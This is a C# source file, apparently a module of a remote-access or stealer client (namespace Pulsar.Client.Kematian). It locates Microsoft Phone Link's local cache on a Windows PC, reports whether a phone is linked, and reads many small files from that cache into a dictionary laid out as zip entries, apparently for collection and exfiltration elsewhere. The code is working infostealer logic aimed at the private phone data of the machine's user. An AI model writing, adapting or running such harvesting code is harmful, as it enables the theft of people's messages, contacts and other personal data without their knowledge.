using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Text;

namespace Pulsar.Client.Kematian.PhoneLink
{
    public class PhoneLinkRetriever
    {
        private static readonly string PhoneLinkPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Packages",
            "Microsoft.YourPhone_8wekyb3d8bbwe",
            "LocalCache",
            "Local",
            "Microsoft");

        /// <summary>
        /// Test method to verify the implementation
        /// </summary>
        public static void TestPhoneLinkDetection()
        {
            try
            {
                string status = GetPhoneLinkStatus();
                Debug.WriteLine("PhoneLink Status: " + status);
                
                var files = GetPhoneLinkFiles();
                Debug.WriteLine($"Found {files.Count} PhoneLink files");
                
                foreach (var file in files.Keys)
                {
                    Debug.WriteLine($"File: {file} - Size: {files[file].Length} bytes");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Test failed: {ex.Message}");
            }
        }

        /// <summary>
        /// Checks if the user has a phone linked to their PC through Microsoft's Phone Link (Your Phone) app
        /// </summary>
        /// <returns>String describing the phone link status</returns>
        public static string GetPhoneLinkStatus()
        {
            try
            {
                if (!Directory.Exists(PhoneLinkPath))
                {
                    return "Phone Link is not installed or path doesn't exist";
                }

                // Check if there are any files or directories in the path
                string[] entries = Directory.GetFileSystemEntries(PhoneLinkPath);
                
                if (entries.Length == 0)
                {
                    return "No phone linked to PC (Phone Link app is installed but no phone data found)";
                }
                
                // Build detailed report of what was found
                StringBuilder report = new StringBuilder();
                report.AppendLine("Phone is linked to PC - Details:");
                
                try
                {
                    foreach (string entry in entries)
                    {
                        if (Directory.Exists(entry))
                        {
                            string dirName = Path.GetFileName(entry);
                            string[] files = Directory.GetFiles(entry, "*", SearchOption.AllDirectories);
                            report.AppendLine($"- Directory: {dirName} ({files.Length} files)");
                        }
                        else
                        {
                            string fileName = Path.GetFileName(entry);
                            long fileSize = new FileInfo(entry).Length;
                            report.AppendLine($"- File: {fileName} ({fileSize} bytes)");
                        }
                    }
                }
                catch (Exception ex)
                {
                    report.AppendLine($"Error scanning contents: {ex.Message}");
                }
                
                return report.ToString();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in GetPhoneLinkStatus: {ex.Message}");
                return $"Error checking Phone Link status: {ex.Message}";
            }
        }
        
        /// <summary>
        /// Collects Phone Link related files for analysis
        /// </summary>
        /// <returns>Dictionary with file paths and contents</returns>
        public static Dictionary<string, byte[]> GetPhoneLinkFiles()
        {
            Dictionary<string, byte[]> phoneLinkFiles = new Dictionary<string, byte[]>();
            
            try
            {
                if (!Directory.Exists(PhoneLinkPath))
                {
                    return phoneLinkFiles;
                }
                
                // Get up to 10 files from each subdirectory to avoid collecting too much data
                foreach (string dir in Directory.GetDirectories(PhoneLinkPath))
                {
                    string dirName = Path.GetFileName(dir);
                    int fileCount = 0;
                    
                    foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            if (fileCount >= 10)
                                break;
                                
                            FileInfo fileInfo = new FileInfo(file);
                            // Skip files larger than 1MB to avoid collecting large media files
                            if (fileInfo.Length > 1024 * 1024)
                                continue;
                                
                            byte[] fileContent = File.ReadAllBytes(file);
                            string fileName = file.Substring(PhoneLinkPath.Length).TrimStart('\\');
                            string zipPath = $"PhoneLink\\{fileName}";
                            phoneLinkFiles[zipPath] = fileContent;
                            fileCount++;
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error reading file {file}: {ex.Message}");
                        }
                    }
                }
                
                // Add a report file with the phone link status
                string status = GetPhoneLinkStatus();
                phoneLinkFiles["PhoneLink\\status.txt"] = System.Text.Encoding.UTF8.GetBytes(status);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in GetPhoneLinkFiles: {ex.Message}");
            }
            
            return phoneLinkFiles;
        }
    }
} 